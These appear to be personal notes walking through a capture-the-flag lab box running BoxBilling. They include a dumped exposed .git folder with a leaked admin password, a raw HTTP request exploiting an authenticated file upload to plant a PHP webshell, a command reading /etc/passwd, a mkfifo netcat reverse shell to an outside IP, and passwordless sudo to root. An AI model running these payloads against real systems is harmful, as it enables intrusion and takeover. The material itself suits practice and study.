nmap shows ports 22, 80 open

add bullybox.local to /etc/hosts

we find a BoxBilling.com, and on clicking login, we see the version as well
a quick search on searchsploit shows an exploit for file upload, but we need authenticated session
we start scraping blogs, forums and knowledge bases in the website. Only thing we find is Admin
we try with Admin@bullybox.local:admin, Admin@bullybox.local:password, nothing works

HINT TAKEN: there's a .git folder exposed. looking at a walkthrough, they see it on nmap scan, but I dint. rerunning nmap specific to port 80 revealed that endpoint. Also, added .git to the wordlists, so I wont ever miss them in the future
IP/.git was not allowed, so we go the git-dumper route

`/opt/venv1/bin/git-dumper http://bullybox.local/.git/ src`
we find a file bb-config.php, where we find password, for the user admin
now, we use admin@bullybox.local : Playing-Unstylish7-Provided to login at /bb-admin and we're logged in.
Time to put the exploit to work.
we capture a request in burp, send it to repeater, and modify the things we need to, from the poc, such as phpsessid, host
```http
POST /index.php?_url=/api/admin/Filemanager/save_file HTTP/1.1
Host: bullybox.local
Content-Length: 52
Accept: application/json, text/javascript, */*; q=0.01
DNT: 1
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
(KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=2kpjlorpha7134096552dcaqv3
Connection: close

order_id=1&path=ax.php&data=<%3fphp+phpinfo()%3b%3f>
```
This means, the uploaded file is ax.php, and the code is has is phpinfo(), which gets executed upon visiting bullybox.local/ax.php
Now, we modify it to upload a file that does php 1 liner cmd exec
`order_id=1&path=backd.php&data=<%3fphp+echo+shell_exec($_GET["cmd"])%3b+%3f>
`
Now, we visit bullybox.local/backd.php?cmd=cat+/etc/passwd shows us the file, so we have code execution
we make it run mkfifo rev shell now
`backd.php?cmd=mkfifo+/tmp/f%3b+nc+192.168.45.168+1234+<+/tmp/f+|+/bin/sh+>/tmp/f+2>%261%3b+rm+tmp/f`
yuki!

---
sudo -l shows we have all no password root
`sudo -i`
root!

---
---
---
we see, in a walkthrough someone uploading the whole php-reverse-shell.php into the file-upload in burpsuite in the `<?php ?>` tags